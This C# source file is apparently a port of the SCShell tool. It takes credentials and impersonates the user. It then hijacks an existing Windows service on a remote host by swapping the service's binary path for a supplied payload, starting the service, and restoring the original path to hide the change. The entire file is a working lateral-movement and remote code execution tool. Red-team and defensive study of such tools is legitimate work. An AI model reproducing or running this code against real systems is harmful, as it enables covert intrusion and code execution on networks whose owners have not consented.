using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace SharpSCShell
{
    class Program
    {
        [DllImport("advapi32.dll", SetLastError = true, BestFitMapping = false, ThrowOnUnmappableChar = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool LogonUser(
          [MarshalAs(UnmanagedType.LPStr)] string lpszUsername,
          [MarshalAs(UnmanagedType.LPStr)] string lpszDomain,
          [MarshalAs(UnmanagedType.LPStr)] string lpszPassword,
          int dwLogonType,
          int dwLogonProvider,
          ref IntPtr phToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool ImpersonateLoggedOnUser(IntPtr hToken);


        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(
            string lpMachineName, 
            string lpDatabaseName, 
            uint dwDesiredAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(
            IntPtr hSCManager, 
            string lpServiceName, 
            uint dwDesiredAccess);

        [DllImport("advapi32.dll",
            SetLastError = true, CharSet = CharSet.Auto)]
        private static extern int QueryServiceConfig(
            IntPtr service,
            IntPtr queryServiceConfig,
            int bufferSize,
            ref int bytesNeeded);

        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(
            IntPtr hService,
            uint dwServiceType,
            int dwStartType,
            int dwErrorControl,
            string lpBinaryPathName,
            string lpLoadOrderGroup,
            string lpdwTagId,
            string lpDependencies,
            string lpServiceStartName,
            string lpPassword,
            string lpDisplayName);

        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(
            IntPtr hService,
            int dwNumServiceArgs,
            string[] lpServiceArgVectors
            );
        public enum ACCESS_MASK : uint
        {
            STANDARD_RIGHTS_REQUIRED = 0x000F0000,
            STANDARD_RIGHTS_READ = 0x00020000,
            STANDARD_RIGHTS_WRITE = 0x00020000,
            STANDARD_RIGHTS_EXECUTE = 0x00020000,
        }
        public enum SCM_ACCESS : uint
        {
            SC_MANAGER_CONNECT = 0x00001,
            SC_MANAGER_CREATE_SERVICE = 0x00002,
            SC_MANAGER_ENUMERATE_SERVICE = 0x00004,
            SC_MANAGER_LOCK = 0x00008,
            SC_MANAGER_QUERY_LOCK_STATUS = 0x00010,
            SC_MANAGER_MODIFY_BOOT_CONFIG = 0x00020,
            SC_MANAGER_ALL_ACCESS = ACCESS_MASK.STANDARD_RIGHTS_REQUIRED |
                SC_MANAGER_CONNECT |
                SC_MANAGER_CREATE_SERVICE |
                SC_MANAGER_ENUMERATE_SERVICE |
                SC_MANAGER_LOCK |
                SC_MANAGER_QUERY_LOCK_STATUS |
                SC_MANAGER_MODIFY_BOOT_CONFIG,

            GENERIC_READ = ACCESS_MASK.STANDARD_RIGHTS_READ |
                SC_MANAGER_ENUMERATE_SERVICE |
                SC_MANAGER_QUERY_LOCK_STATUS,

            GENERIC_WRITE = ACCESS_MASK.STANDARD_RIGHTS_WRITE |
                SC_MANAGER_CREATE_SERVICE |
                SC_MANAGER_MODIFY_BOOT_CONFIG,

            GENERIC_EXECUTE = ACCESS_MASK.STANDARD_RIGHTS_EXECUTE |
                SC_MANAGER_CONNECT | SC_MANAGER_LOCK,

            GENERIC_ALL = SC_MANAGER_ALL_ACCESS,
        }
        public enum SERVICE_ACCESS : uint
        {
            STANDARD_RIGHTS_REQUIRED = 0xF0000,
            SERVICE_QUERY_CONFIG = 0x00001,
            SERVICE_CHANGE_CONFIG = 0x00002,
            SERVICE_QUERY_STATUS = 0x00004,
            SERVICE_ENUMERATE_DEPENDENTS = 0x00008,
            SERVICE_START = 0x00010,
            SERVICE_STOP = 0x00020,
            SERVICE_PAUSE_CONTINUE = 0x00040,
            SERVICE_INTERROGATE = 0x00080,
            SERVICE_USER_DEFINED_CONTROL = 0x00100,
            SERVICE_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED |
                              SERVICE_QUERY_CONFIG |
                              SERVICE_CHANGE_CONFIG |
                              SERVICE_QUERY_STATUS |
                              SERVICE_ENUMERATE_DEPENDENTS |
                              SERVICE_START |
                              SERVICE_STOP |
                              SERVICE_PAUSE_CONTINUE |
                              SERVICE_INTERROGATE |
                              SERVICE_USER_DEFINED_CONTROL)
        }
        private struct QueryServiceConfigStruct
        {
            public int serviceType;
            public int startType;
            public int errorControl;
            public IntPtr binaryPathName;
            public IntPtr loadOrderGroup;
            public int tagID;
            public IntPtr dependencies;
            public IntPtr startName;
            public IntPtr displayName;
        }


        [DllImport("kernel32.dll")]
        public static extern uint GetLastError();

        [DllImport("kernel32.dll")]
        static extern IntPtr GlobalAlloc(uint uFlags, UIntPtr dwBytes);

        static void Main(string[] args)
        {
            Console.WriteLine();
            Console.WriteLine("=============== SharpSCShell --> Revised at Rcoil (C# version) =============== ");
            Console.WriteLine();
            if (args.Length < 2)
            {
                Console.WriteLine("SharpSCShell.exe target service payload domain username password");
                Environment.Exit(0);
            }
            
            string target = args[0];
            string ServiceName = args[1];
            string payload = args[2];
            string domain = args[3];
            string username = args[4];
            string password = args[5];
            const int LOGON32_LOGON_NEW_CREDENTIALS = 9;
            const int LOGON32_PROVIDER_DEFAULT = 0;
            const uint SERVICE_NO_CHANGE = 0xffffffff;
            const int SERVICE_DEMAND_START = 0x00000003;
            const int SERVICE_ERROR_IGNORE = 0x00000000;
            IntPtr phToken = IntPtr.Zero;
            int bytesNeeded = 5;

            Console.WriteLine("[*] Trying to connect to {0}", target);
            bool bResult = false;
            if (username != null)
            {
                Console.WriteLine("[*] Username was provided attempting to call LogonUser");
                bResult = LogonUser(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, ref phToken);
                if (!bResult)
                {
                    Console.WriteLine("[!] LogonUser failed. Error:{0}", GetLastError());
                    Environment.Exit(0);
                }
            }
            bResult = ImpersonateLoggedOnUser(phToken);
            if (!bResult)
            {
                Console.WriteLine("[!] ImpersonateLoggedOnUser failed. Error:{0}", GetLastError());
                Environment.Exit(0);
            }

            IntPtr SCMHandle = OpenSCManager(target, null, (uint)SCM_ACCESS.SC_MANAGER_ALL_ACCESS);
            if (SCMHandle == IntPtr.Zero)
            {
                Console.WriteLine("[!] OpenSCManagerA failed! Error:{0}", GetLastError());
                Environment.Exit(0);
            }
            Console.WriteLine("[*] SC_HANDLE Manager 0x{0}", SCMHandle);

            Console.WriteLine("[*] Opening {0} Service ....", ServiceName);
            IntPtr schService = OpenService(SCMHandle, ServiceName, ((uint)SERVICE_ACCESS.SERVICE_ALL_ACCESS));
            Console.WriteLine("[*] SC_HANDLE Service 0x{0}", schService);

            
            QueryServiceConfigStruct qscs = new QueryServiceConfigStruct();
            IntPtr qscPtr = Marshal.AllocCoTaskMem(0);
            int retCode = QueryServiceConfig(schService, qscPtr, 0, ref bytesNeeded);
            if (retCode == 0 && bytesNeeded == 0)
            {
                Console.WriteLine("[!] QueryServiceConfig failed to read the service path. Error:{0}", GetLastError());
            }
            else
            {
                Console.WriteLine("[*] LPQUERY_SERVICE_CONFIGA need {0} bytes", bytesNeeded);
                qscPtr = Marshal.AllocCoTaskMem(bytesNeeded);
                retCode = QueryServiceConfig(schService, qscPtr, bytesNeeded, ref bytesNeeded);
                qscs.binaryPathName = IntPtr.Zero;

                qscs = (QueryServiceConfigStruct)Marshal.PtrToStructure(qscPtr, new QueryServiceConfigStruct().GetType());
            }

            string originalBinaryPath = Marshal.PtrToStringAuto(qscs.binaryPathName);
            Console.WriteLine("[*] Original service binary path \"{0}\"", originalBinaryPath);
            Marshal.FreeCoTaskMem(qscPtr);

            bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, payload, null, null, null, null, null, null);
            if (!bResult)
            {
                Console.WriteLine("[!] ChangeServiceConfigA failed to update the service path. Error:{0}", GetLastError());
                Environment.Exit(0);
            }
            Console.WriteLine("[*] Service path was changed to \"{0}\"", payload);


            bResult = StartService(schService, 0, null);
            uint dwResult = GetLastError();
            if (!bResult && dwResult != 1053)
            {
                Console.WriteLine("[!] StartServiceA failed to start the service. Error:{0}", GetLastError());
                Environment.Exit(0);
            }
            else
            {
                Console.WriteLine("[*] Service was started");
            }
            bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, originalBinaryPath, null, null, null, null, null, null);
            if (!bResult)
            {
                Console.WriteLine("[!] ChangeServiceConfigA failed to revert the service path. Error:{0}", GetLastError());
                Environment.Exit(0);
            }
            else
            {
                Console.WriteLine("[*] Service path was restored to \"{0}\"", originalBinaryPath);
            }
        }
    }
}